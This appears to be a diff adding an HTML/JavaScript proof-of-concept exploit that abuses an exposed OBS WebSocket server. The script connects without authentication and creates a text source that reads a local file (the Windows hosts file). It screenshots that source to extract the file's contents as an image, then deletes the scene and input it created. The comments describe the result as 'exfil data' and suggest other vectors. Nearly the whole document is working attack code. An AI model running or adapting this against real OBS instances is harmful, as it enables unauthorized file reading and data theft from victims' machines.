@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TXT File Read Primer - exp01</title>
+</head>
+<body>
+
+    <script src="https://cdn.jsdelivr.net/npm/obs-websocket-js"></script>
+
+    <script>
+
+        // Helper functions
+        function sleep(seconds) {
+            return new Promise((resolve) => setTimeout(resolve, seconds * 1000));
+        }
+
+        // Generates a non-predictable name from a cryptographically random source
+        function randomString(length = 12) {
+            const chars = "abcdefghijklmnopqrstuvwxyz";
+            const values = crypto.getRandomValues(new Uint32Array(length));
+
+            return Array.from(values, (value) => chars[value % chars.length]).join("");
+        }
+
+    (async () => {
+        // TXT File Read Primer - exp01
+        // Read a local file as UTF-8 text and render it through OBS. This is not a full
+        // filesystem access primitive: it applies to text files, and garbled output means
+        // the file is likely not readable this way - try an additional vector.
+        // The result is exported as an image, so the exfil data must be hand-typed or OCR'd.
+
+        console.log('Starting...');
+        let obs = new OBSWebSocket();
+
+        // Constants - connections
+        const targetHost = '192.168.0.22';
+        const targetPort = '4455';
+        const target_ws_connection_string = "ws://" + targetHost + ":" + targetPort;
+        const target_ws_password = "randompass";
+
+        // Constants - primer
+        const sceneName = randomString();
+        const inputName = randomString();
+        const txtRetrieveVector = "text_gdiplus_v3"; // Input kind required to read text from a file
+        const targetFile = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+
+        // Connect to the target OBS instance
+        //await obs.connect(target_ws_connection_string, target_ws_password); // Password-authenticated connect (not currently working)
+        await obs.connect(target_ws_connection_string); // Connect without authentication
+
+        // List the input kinds available on the target
+        const kinds = await obs.call("GetInputKindList");
+
+        // Remove the input first if it is already present
+        try {
+            await obs.call("RemoveInput", {
+            inputName: inputName,
+        });
+            console.log('Input exists and deleted: ' + inputName);
+        } catch (error) {
+            console.log("Input doesn't exist: " + inputName);
+        }
+
+        console.log("Input Kinds available on source: " + kinds.inputKinds);
+
+        // Verify the text input kind exists; without it the primer cannot proceed
+        if (kinds.inputKinds.includes(txtRetrieveVector)) {
+            console.log(txtRetrieveVector + " exists as InputKind, continuing");
+        } else {
+            console.log("This is gonna fail....");
+        }
+
+        await sleep(1)
+
+        // Check whether the scene already exists and create it if not
+        const { scenes } = await obs.call("GetSceneList");
+
+        const sceneExists = scenes.some(
+        scene => scene.sceneName === sceneName
+        );
+
+        if (!sceneExists) {
+        console.log("Creating scene:", sceneName);
+
+        await obs.call("CreateScene", {
+            sceneName
+        });
+        } else {
+        console.log("Scene already exists:", sceneName);
+        }
+
+        // 1. Create a source pointing at the target file.
+        // The source renders off-screen, independent of scene visibility.
+        console.log('Create input: ' + inputName);
+        console.log('Will try to read: ' + targetFile);
+        await obs.call("CreateInput", {
+        sceneName: sceneName,
+        inputName: inputName,
+        inputKind: "text_gdiplus_v3",
+
+        inputSettings: {
+            read_from_file: true,      // Load the text directly from the target file
+            file: targetFile,
+
+            color: 0xFFFFFF,           // White text
+            opacity: 100,
+            bk_color: 0x000000,        // Black background for consistent contrast
+            bk_opacity: 100,
+
+            antialiasing: true,        // Improves legibility of the captured text
+
+            font: {
+            face: "Consolas",          // Monospace font keeps the text layout predictable
+            size: 30
+            }
+        },
+
+        sceneItemEnabled: true
+        });
+
+        await sleep(1)
+
+        // 2. Screenshot the source; the file content is returned as base64 image data
+        console.log('Read Target and Retrieve Screenshot')
+        const { imageData } = await obs.call("GetSourceScreenshot", {
+            sourceName: inputName,
+            imageFormat: "png", // PNG avoids lossy artifacts in text rendering
+            imageWidth: 2000
+        });
+
+        // 3. imageData = "data:image/png;base64,iVBOR..."
+        console.log("Valid base64 returned...."); // Need to check the returned type here.
+        console.log("Length of base64 (bigger better kinda):", imageData.length);
+
+        const img = document.createElement("img");
+
+        img.style.maxWidth = "800px";
+        img.style.height = "auto";
+        img.style.display = "block";
+        img.style.background = "#888";
+        img.style.border = "1px solid red";
+
+        img.onload = () => {
+            console.log("Loaded img specs:", img.naturalWidth, img.naturalHeight);
+        };
+
+        img.onerror = (e) => {
+            console.error("IMAGE ERROR:", e);
+        };
+
+        img.src = imageData;
+
+        document.body.appendChild(img);
+
+        await sleep(1)
+
+        // 4. Cleanup - remove the input and scene created for the primer
+        console.log('Cleaning input and scene generated...');
+        console.log('Cleaning: ' + inputName + ' and ' + sceneName);
+        await obs.call("RemoveInput", { inputName: inputName });
+        await obs.call("RemoveScene", {sceneName: sceneName})
+        console.log('Done...');
+    })();
+
+
+    </script>
+
+</body>
+</html>
